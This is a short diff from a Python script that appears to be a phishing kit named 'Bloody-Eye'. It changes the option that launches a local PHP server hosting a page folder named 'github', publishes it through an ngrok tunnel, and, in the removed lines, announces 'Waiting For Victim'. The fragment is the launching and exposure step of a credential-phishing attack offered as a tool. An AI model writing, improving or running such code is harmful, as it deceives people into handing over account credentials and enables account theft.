@@ -992,17 +992,10 @@ exit();
     elif v == "02":
       with open("log","w") as phplog:
         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/website/github"),stderr=phplog,stdout=phplog)
-        print("")
-        time.sleep(0.07)
-        print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
-        link = ngrok.connect(6060,"http")
-
-      a_print_link = (Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.RED+" Port Has Forwarded on >>> "+link)
-      b_print_link = (a_print_link).replace("http","https")
-      print("\n"+b_print_link)
       print("")
       time.sleep(0.07)
-      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
+      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
+      link = ngrok.connect(6060,"http")
     
     
     
